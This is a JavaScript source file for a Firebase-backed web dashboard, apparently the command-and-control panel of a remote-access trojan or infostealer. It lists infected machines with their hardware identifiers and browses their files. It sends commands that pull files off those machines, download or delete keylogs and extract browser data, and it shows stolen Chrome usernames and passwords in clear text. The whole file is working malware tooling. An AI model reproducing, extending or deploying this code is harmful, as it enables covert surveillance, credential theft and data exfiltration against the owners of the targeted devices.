import { firebaseConfig } from "./firebase-config.js";
import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
import { getAuth, signInWithEmailAndPassword, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-auth.js";
import { getDatabase, ref, onValue, push, set } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js";

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getDatabase(app);

// State
let currentDevice = null;
let currentPath = ""; // Root
let allFilesFlat = [];

// DOM Elements
const authContainer = document.getElementById('auth-container');
const appContainer = document.getElementById('app-container');
const loginBtn = document.getElementById('login-btn');
const logoutBtn = document.getElementById('logout-btn');
const emailInput = document.getElementById('email');
const passwordInput = document.getElementById('password');
const errorMsg = document.getElementById('error-msg');
const deviceList = document.getElementById('device-list');
const noDeviceMsg = document.getElementById('no-device-selected');
const deviceView = document.getElementById('device-view');

// Auth Logic
onAuthStateChanged(auth, (user) => {
    if (user) {
        authContainer.classList.add('hidden');
        appContainer.classList.remove('hidden');
        loadDevices();
    } else {
        authContainer.classList.remove('hidden');
        appContainer.classList.add('hidden');
    }
});

loginBtn.addEventListener('click', () => {
    signInWithEmailAndPassword(auth, emailInput.value, passwordInput.value)
        .catch(err => errorMsg.textContent = err.message);
});

logoutBtn.addEventListener('click', () => signOut(auth));

// Device Management
function loadDevices() {
    const devicesRef = ref(db, 'devices');
    onValue(devicesRef, (snapshot) => {
        deviceList.innerHTML = '';
        const data = snapshot.val();
        if (data) {
            Object.keys(data).forEach(key => {
                const device = data[key];
                const div = document.createElement('div');
                div.className = `sidebar-item ${currentDevice === key ? 'active' : ''}`;
                div.innerHTML = `
                    <span class="sidebar-icon"><i class="fas fa-desktop"></i></span>
                    ${device.hostname || key}
                `;
                div.onclick = () => selectDevice(key, device);
                deviceList.appendChild(div);
            });
        }
    });
}

window.selectDevice = (deviceId, data) => {
    currentDevice = deviceId;

    // UI Updates
    noDeviceMsg.classList.add('hidden');
    deviceView.classList.remove('hidden');
    document.getElementById('header-hostname').textContent = data.hostname || deviceId;
    document.getElementById('header-ip').textContent = data.private_ip || 'Offline';

    // Highlight Sidebar
    document.querySelectorAll('.sidebar-item').forEach(el => el.classList.remove('active'));
    // (Re-render list to highlight or manually add class - simplistic approach: re-render is auto via listener usually, but for instant feedback:)
    // We rely on loadDevices listener or manual class toggle. loadDevices might flicker.

    // Load Data
    switchTab('overview'); // Default tab
    updateSystemInfo(deviceId);
    loadFiles(deviceId);
    loadDownloads(deviceId);
};

// Tabs Logic
window.switchTab = (tabName) => {
    // Hide all tabs
    document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
    document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));

    // Show selected
    document.getElementById(`tab-${tabName}`).classList.add('active');

    // Highlight button (Need to map button index or use event target)
    // Simple way: find button with onclick containing tabName
    const buttons = document.querySelectorAll('.tab-btn');
    buttons.forEach(btn => {
        if (btn.getAttribute('onclick').includes(tabName)) btn.classList.add('active');
    });
};

// System Info
function updateSystemInfo(deviceId) {
    onValue(ref(db, `devices/${deviceId}`), (snap) => {
        const d = snap.val();
        if (!d) return;

        setText('info-os', d.os_name || 'Windows');
        setText('info-ram', d.ram_usage || '-');
        setText('info-activity', d.active_window || 'Idle');
        setText('info-lastseen', new Date(d.last_seen || Date.now()).toLocaleString());
    });

    // 2. Count Files
    onValue(ref(db, `files/${deviceId}`), (snap) => {
        const data = snap.val();
        const count = data ? (Array.isArray(data) ? data.length : Object.keys(data).length) : 0;
        setText('info-files', count);
    });

    // 3. Count Passwords
    onValue(ref(db, `browser_data/${deviceId}/chrome/passwords`), (snap) => {
        const data = snap.val();
        const count = data ? (Array.isArray(data) ? data.length : Object.keys(data).length) : 0;
        setText('info-passwords', count);
    });

    // 4. Count Downloads
    onValue(ref(db, `responses/${deviceId}`), (snap) => {
        const data = snap.val();
        const count = data ? Object.keys(data).length : 0;
        setText('info-downloads', count);
    });

    // 5. Advanced Info (MAC / Serial)
    onValue(ref(db, `devices/${deviceId}`), (snap) => {
        const d = snap.val();
        if (d) {
            setText('info-mac', d.mac_address || 'Unknown');
            setText('info-serial', d.serial_number || 'Unknown');
        }
    });
}

function setText(id, text) {
    const el = document.getElementById(id);
    if (el) el.textContent = text;
}

// File Explorer Logic
function loadFiles(deviceId) {
    const fileView = document.getElementById('file-view');
    fileView.innerHTML = '<div style="padding:20px; text-align:center">Loading Index...</div>';

    onValue(ref(db, `files/${deviceId}`), (snapshot) => {
        const data = snapshot.val();
        if (data) {
            allFilesFlat = Array.isArray(data) ? data : Object.values(data);
            currentPath = ""; // Reset to root
            renderFiles("");
        } else {
            fileView.innerHTML = `
                <div style="padding:20px; text-align:center">
                    <div>No files indexed yet.</div>
                    <button class="action-btn" onclick="sendCommand('force_index', 'Index started. Wait 30s.')" style="margin-top:10px">
                        <i class="fas fa-sync"></i> Force Index
                    </button>
                </div>`;
        }
    }); // Removed onlyOnce: true to allow real-time updates
}

window.renderFiles = (path) => {
    currentPath = path;
    const fileView = document.getElementById('file-view');
    fileView.innerHTML = '';
    updateBreadcrumbs(path);

    const contents = new Map();

    // "Up" Navigation
    if (path !== "") {
        const parts = path.split('\\');
        parts.pop();
        const upPath = parts.join('\\');
        addFileRow(fileView, '..', 'UP', upPath, 'folder');
    }

    allFilesFlat.forEach(file => {
        const normalizedPath = file.path.replace(/\//g, '\\');

        // Root Logic (Drives)
        if (path === "") {
            const rootPart = normalizedPath.split('\\')[0]; // C:
            if (!contents.has(rootPart)) {
                contents.set(rootPart, { name: rootPart, type: 'drive', path: rootPart });
            }
            return;
        }

        // Folder Logic
        if (normalizedPath.toLowerCase().startsWith(path.toLowerCase() + '\\')) {
            const relative = normalizedPath.substring(path.length + 1);
            const parts = relative.split('\\');

            if (parts.length > 1) {
                const folderName = parts[0];
                if (!contents.has(folderName)) {
                    contents.set(folderName, { name: folderName, type: 'folder', path: path + '\\' + folderName });
                }
            } else {
                contents.set(relative, { name: relative, type: 'file', data: file });
            }
        }
    });

    // Sort & Render
    const sorted = Array.from(contents.values()).sort((a, b) => {
        if (a.type === b.type) return a.name.localeCompare(b.name);
        return a.type === 'file' ? 1 : -1;
    });

    if (sorted.length === 0 && path !== "") {
        fileView.innerHTML = '<div style="padding:20px">Empty Folder</div>';
    }

    sorted.forEach(item => {
        if (item.type === 'file') {
            addFileRow(fileView, item.name, 'FILE', item.data.path, 'file', item.data.size);
        } else {
            addFileRow(fileView, item.name, 'DIR', item.path, 'folder');
        }
    });
};

function addFileRow(container, name, type, pathOrData, iconType, size = 0) {
    const div = document.createElement('div');
    div.className = `file-row ${iconType}`;

    let icon = iconType === 'folder' ? 'fa-folder' : 'fa-file';
    if (type === 'UP') icon = 'fa-arrow-up';
    if (type === 'drive') icon = 'fa-hdd';

    const sizeStr = size > 0 ? (size / 1024).toFixed(1) + ' KB' : '-';

    // Actions
    let actionBtn = '';
    if (iconType === 'file') {
        // Escaping backslashes for JS string
        const safePath = pathOrData.replace(/\\/g, '\\\\');
        // Pass event explicitly
        actionBtn = `<button class="icon-btn" onclick="downloadFile(event, '${safePath}')"><i class="fas fa-download"></i></button>`;
    }

    div.innerHTML = `
        <div class="file-icon"><i class="fas ${icon}"></i></div>
        <div>${name}</div>
        <div>${sizeStr}</div>
        <div>${type}</div>
        <div>${actionBtn}</div>
    `;

    if (iconType !== 'file') {
        div.onclick = () => renderFiles(pathOrData);
    }

    container.appendChild(div);
}

function updateBreadcrumbs(path) {
    const el = document.getElementById('breadcrumbs');
    // Start with Root
    let html = '<span class="crumb" onclick="renderFiles(\'\')">This PC</span>';

    if (path) {
        const parts = path.split('\\');
        let currentBuild = "";
        parts.forEach(p => {
            currentBuild += (currentBuild ? '\\' : '') + p;
            // Escape for onclick
            const safePath = currentBuild.replace(/\\/g, '\\\\');
            html += `<span class="crumb" onclick="renderFiles('${safePath}')">${p}</span>`;
        });
    }
    el.innerHTML = html;
}

window.refreshFiles = () => loadFiles(currentDevice);

// Commands
window.downloadKeylogs = async () => sendCommand('keylog_download', 'Keylog download requested.');
window.deleteKeylogs = async () => {
    if (confirm('Are you sure? This deletes logs on the target device.')) {
        sendCommand('keylog_delete', 'Delete command sent.');
    }
};
window.extractBrowserData = async () => sendCommand('browser_extract', 'Extraction started. Check Overview panel.');

window.downloadFile = async (e, path) => {
    e.stopPropagation();
    if (confirm(`Download ${path}?`)) {
        push(ref(db, `requests/${currentDevice}`), {
            type: 'download',
            path: path,
            timestamp: Date.now()
        });
        alert('Download requested. Check "Downloads" tab shortly.');
    }
};

async function sendCommand(type, msg) {
    if (!currentDevice) return alert('Select a device first');
    await push(ref(db, `requests/${currentDevice}`), {
        type: type,
        timestamp: Date.now()
    });
    alert(msg);
}

// Downloads Listener
function loadDownloads(deviceId) {
    const el = document.getElementById('downloads-list');
    onValue(ref(db, `responses/${deviceId}`), (snap) => {
        const data = snap.val();
        if (!data) {
            el.innerHTML = '<div style="padding:20px; opacity: 0.5;">No downloads yet.</div>';
            return;
        }

        let html = '';
        // Sort by timestamp desc
        const sorted = Object.values(data).sort((a, b) => b.timestamp - a.timestamp);

        sorted.forEach(item => {
            const name = item.filename || (item.url ? decodeURIComponent(item.url.split('?')[0].split('/').pop()) : 'Unknown File');
            const dateStr = new Date(item.timestamp).toLocaleTimeString();

            let action = '';
            // New Granular Statuses
            if (item.status === 'initiating') {
                action = `<span style="color:#3498db"><i class="fas fa-search"></i> Locating...</span>`;
            } else if (item.status === 'uploading') {
                action = `<span style="color:#f1c40f"><i class="fas fa-spinner fa-spin"></i> Uploading...</span>`;
            } else if (item.status === 'processing') {
                action = `<span style="color:#9b59b6"><i class="fas fa-cog fa-spin"></i> Processing...</span>`;
            } else if (item.status === 'success' || (item.url && !item.status)) { // Fallback for old items
                // Use File.io or Base64 data if we used that (we reverted to File.io so url is link)
                action = `<a href="${item.url}" target="_blank" class="action-btn"><i class="fas fa-download"></i> Open</a>`;
            } else if (item.status === 'failed' || item.error) {
                const errMsg = item.message || item.error || 'Failed';
                action = `<span style="color:#e74c3c" title="${errMsg}"><i class="fas fa-times"></i> ${errMsg}</span>`;
            } else {
                action = `<span style="opacity:0.5">Waiting...</span>`;
            }

            html += `
                <div class="download-item">
                    <div>
                        <div style="font-weight: 500">${name}</div>
                        <div style="font-size: 11px; opacity: 0.7">${dateStr}</div>
                    </div>
                    <div>${action}</div>
                </div>
            `;
        });
        el.innerHTML = html;
    });
}

// Browser Data Listener
// (Keep similar logic to before for password display)
// ... (Can be ported if needed, or simplified)
// Integrating simplified version:

onValue(ref(db, 'browser_data'), (snap) => {
    // Global listener or specific? sticking to device-specific logic for now
    // Actually, selectDevice triggers specific listeners usually.
    // Let's add a dynamic listener in selectDevice or just global logic here checking currentDevice.
});

// We'll add a specific listener function called by selectDevice
const browserPanel = document.getElementById('browser-data-content');
const browserContainer = document.getElementById('browser-data-panel');

// Only run this when device is selected
// Revised approach: A global listener that checks if data updates for currentDevice
onValue(ref(db, 'browser_data'), (snap) => {
    if (!currentDevice) return;
    const allData = snap.val();
    const data = allData ? allData[currentDevice] : null;

    if (data) {
        browserContainer.classList.remove('hidden');
        // Simple JSON dump or Table?
        // Let's do simple table for Chrome
        let html = '';
        if (data.chrome && data.chrome.passwords) {
            html += `<h4>Chrome (${data.chrome.count})</h4>`;
            data.chrome.passwords.forEach(p => {
                html += `<div style="font-size:11px; border-bottom:1px solid #333; padding:5px;">
                    <div style="color:#aaa">${p.url}</div>
                    <div style="display:flex; justify-content:space-between;">
                        <span>${p.username}</span>
                        <code style="color:#0f0">${p.password}</code>
                    </div>
                </div>`;
            });
        }
        browserPanel.innerHTML = html || 'No passwords found.';
    } else {
        browserContainer.classList.add('hidden');
    }
});
